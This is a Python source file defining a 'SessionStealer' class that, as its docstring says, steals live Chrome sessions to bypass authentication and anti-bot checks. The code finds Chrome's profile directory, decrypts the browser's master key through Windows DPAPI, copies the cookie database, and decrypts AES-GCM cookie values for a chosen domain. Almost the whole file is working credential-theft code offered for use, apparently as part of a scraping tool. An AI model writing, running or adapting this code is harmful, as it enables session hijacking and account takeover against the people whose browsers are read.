"""
Session and Cookie Hijacking
============================
NASA Standard: High-fidelity session replication.
Steals live sessions from Chrome to bypass authentication and anti-bot.
"""

import base64
import json
import logging
import os
import shutil
import sqlite3
import sys
from pathlib import Path

logger = logging.getLogger("SessionStealer")

class SessionStealer:
    """
    Extracts authenticated sessions from the user's local browser.
    """

    def __init__(self):
        self.chrome_path = self._get_chrome_path()
        self.encryption_key = None

    def _get_chrome_path(self) -> Path:
        """Get platform-specific Chrome data path."""
        if sys.platform == 'win32':
            return Path(os.environ['LOCALAPPDATA']) / "Google" / "Chrome" / "User Data"
        elif sys.platform == 'darwin':
            return Path.home() / "Library" / "Application Support" / "Google" / "Chrome"
        return Path.home() / ".config" / "google-chrome"

    def _get_encryption_key(self) -> bytes | None:
        """Decrypt Chrome's master key using DPAPI (Windows)."""
        local_state_path = self.chrome_path / "Local State"
        if not local_state_path.exists():
            return None

        try:
            with open(local_state_path, encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]

            if sys.platform == 'win32':
                import win32crypt
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return encrypted_key
        except Exception as e:
            logger.error(f"Encryption key recovery failed: {e}")
            return None

    def _decrypt_value(self, ciphertext: bytes, key: bytes) -> str | None:
        """Decrypt AES-GCM cookie values."""
        try:
            from Crypto.Cipher import AES
            if ciphertext[:3] in (b'v10', b'v11'):
                nonce = ciphertext[3:15]
                payload = ciphertext[15:]
                cipher = AES.new(key, AES.MODE_GCM, nonce)
                return cipher.decrypt(payload)[:-16].decode()
            return None
        except Exception:
            return None

    def steal_cookies(self, domain: str) -> dict[str, str]:
        """
        Extract and decrypt cookies for a specific domain.
        NASA Standard: ACID connection, atomic copy.
        """
        cookies_db = self.chrome_path / "Default" / "Network" / "Cookies"
        # Older versions might have it in "Default/Cookies"
        if not cookies_db.exists():
            cookies_db = self.chrome_path / "Default" / "Cookies"

        if not cookies_db.exists():
            logger.error(f"Chrome cookie database not found at {cookies_db}")
            return {}

        temp_db = Path("G:/DeadManUltimateScraper/data/temp_cookies.db")
        shutil.copy2(str(cookies_db), str(temp_db))

        cookies = {}
        try:
            key = self._get_encryption_key()
            if not key:
                return {}

            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute(
                "SELECT name, encrypted_value FROM cookies WHERE host_key LIKE ?",
                (f"%{domain}%",)
            )

            for name, enc_val in cursor.fetchall():
                dec_val = self._decrypt_value(enc_val, key)
                if dec_val:
                    cookies[name] = dec_val

            conn.close()
            logger.info(f"Successfully hijacked {len(cookies)} cookies for {domain}")
            return cookies
        except Exception as e:
            logger.error(f"Cookie theft failed: {e}")
            return {}
        finally:
            if temp_db.exists():
                os.remove(temp_db)
